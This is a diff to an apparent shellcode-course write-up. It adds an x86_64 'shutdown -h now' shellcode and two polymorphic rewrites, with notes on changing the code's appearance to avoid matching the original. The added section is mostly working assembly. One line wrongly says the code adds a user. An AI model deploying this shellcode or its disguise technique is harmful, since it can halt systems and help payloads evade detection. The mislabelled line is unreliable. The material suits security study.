@@ -230,7 +230,6 @@ With all those tricks, the final code has **98 bytes** size. **This is a reduced
 ```asm
 global _start
     section .text
-
 _start:
 
     jmp real_start
@@ -300,22 +299,140 @@ garbage_jump_3_loop:
     xor rdi, rdi
     syscall
 ```
-### Sample 3:
+### Sample 3: `shutdown -h now x86_64 Shellcode`
 ---
+* Shellcode Name: shutdown -h now x86_64 Shellcode
+* Author: Osanda Malith (@OsandaMalith)
+* URL: [http://shell-storm.org/shellcode/files/shellcode-877.php](http://shell-storm.org/shellcode/files/shellcode-877.php)
+* Description: Shutdowns the system
+* Original Shellcode Size: 65 bytes
+* Max Size of the polymorphic Version: 97 bytes
+* Size of the Created Polymorphic Version: 64 bytes (**below the original size**)
 
+The original code defines a string that contains the commands to execute to add the user. For that it is using the JMP-CALL-POP technique to access and refer to thad string.
 
+The original code is:
+```asm
+global _start
+section .text
+_start:
 
+        xor rax, rax
+        xor rdx, rdx
 
+        push rax
+        push byte 0x77
+        push word 0x6f6e ; now
+        mov rbx, rsp
 
+        push rax
+        push word 0x682d ;-h
+        mov rcx, rsp
+
+        push rax
+        mov r8, 0x2f2f2f6e6962732f ; /sbin/shutdown
+        mov r10, 0x6e776f6474756873
+        push r10
+        push r8
+        mov rdi, rsp
+
+        push rdx
+        push rbx
+        push rcx
+        push rdi
+        mov rsi, rsp
+
+        add rax, 59
+        syscall
+```
+To apply polymorphism, first thing that's going to be done is to remove from the stack the command string. It will be stored into `.text` section and accessed by Rel Addressing. For that, a variable is created for each parameter of the command, and a NULL appended to the end of each string. To append the NULLs, RDX is used to avoid NULLs and hence why it's initialized to `0x00` with the `cdq`. To use the `cdq` to make RDX "0", RAX needs to be greater or equal to "0", and that's why the syscall number assignment to RAX has been moved to the start.
+This changes completelly the code, that does not look like the original:
+```asm
+global _start
+section .text
+_start:
+
+        jmp real_start
+        command: db "///sbin/shutdown "
+        arg1   : db "-h "
+        arg2   : db "now "
+
+real_start:
+
+        push 59                         ; Syscall Number moved here
+        pop rax
+        cdq                             ; RDX <- 0x00 as RAX >= 0
+
+        lea rbx, [rel arg2]             ; Rel Addr
+        mov [rbx + 3], byte dl
+
+        lea rcx, [rel arg1]             ; Rel Addr
+        mov [rcx + 2], byte dl
+
+        lea rdi, [rel command]          ; Rel Addr
+        mov [rdi+16], byte dl
+
+        push rdx
+        push rbx
+        push rcx
+        push rdi
+        mov rsi, rsp
+
+        syscall
+```
+That's not all as the shellcode size can be reduced. Let's avoid the use of so many `lea` to reference, as they use opcodes that increase the size of the shellcode, substracting memory positions to the RBX register to point the parameters memory position. Also, the code is reordered to place the `push`es just after getting memory position for each parameter, making the code look very different from the original one and even shorter with 64 bytes for the 65 bytes from the original:
+```asm
+global _start
+section .text
+
+_start:
+
+        jmp real_start
+        command: db "///sbin/shutdown "
+        arg1   : db "-h "
+        arg2   : db "now "
+
+real_start:
+
+        push 59                         ; Syscall Number moved here
+        pop rax
+
+        cdq                             ; RDX <- 0x00 as RAX >= 0
+        push rdx                        ; NULL
+
+        lea rbx, [rel arg2]             ; Rel Addr
+        mov [rbx + 3], byte dl
+        push rbx			; Push @
+
+        sub bl, 3			; Rel Addr
+        push rbx
+        pop rcx
+        mov [rcx + 2], byte dl
+        push rcx			; Push @
+
+        ;lea rdi, [rel command]         ; Rel Addr
+        sub bl, 17
+        push rbx
+        pop rdi
+        mov [rdi+16], byte dl
+        push rdi			; Push @
+
+        push rsp			; Push @ of @
+        pop rsi
+
+        syscall
+```
 ### GitHub Repo Files
 ---
-The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment04) for this assignment contains the following files:
+The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment06) for this assignment contains the following files:
 
 - [Sample_1_Original.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_1_Original.nasm) : Contains the original code for the first sample shellcode, `sethostname() & killall 33`
 - [Sample_1_Polymorph.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_1_Polymorph.nasm) : Polymorph version for the `sethostname() & killall` shellcode.
 - [Sample_2_Original.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment6/Sample_2_Original.nasm) : Contains the original code for the second sample shellcode, `Add map in /etc/hosts file`
 - [Sample_2_Polymorph_V1.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_2_Polymorph_V1.nasm) : V1 of the polymorphed code for the `Add map in /etc/hosts file`.
-- [Sample_2_Polymorph_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_2_Polymorph_V2.nasm) : As the V1 left us bytes to play, created this second version even more obfuscated for th `Add map in /etc/hosts file`.
+- [Sample_2_Polymorph_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_2_Polymorph_V2.nasm) : As the V1 left us bytes to play, created this second version even more obfuscated for th `Add map in /etc/hosts file`
+- [Sample_3_Original.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_3_Original.nasm) : Contains the original code for the `shutdown -h now x86_64 Shellcode` sample shellcode
+- [Sample_3_Polymorph.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_3_Polymorph.nasm) : Polymorph version for the `shutdown -h now x86_64 Shellcode` shellcode.
 
 ### The End
 ---
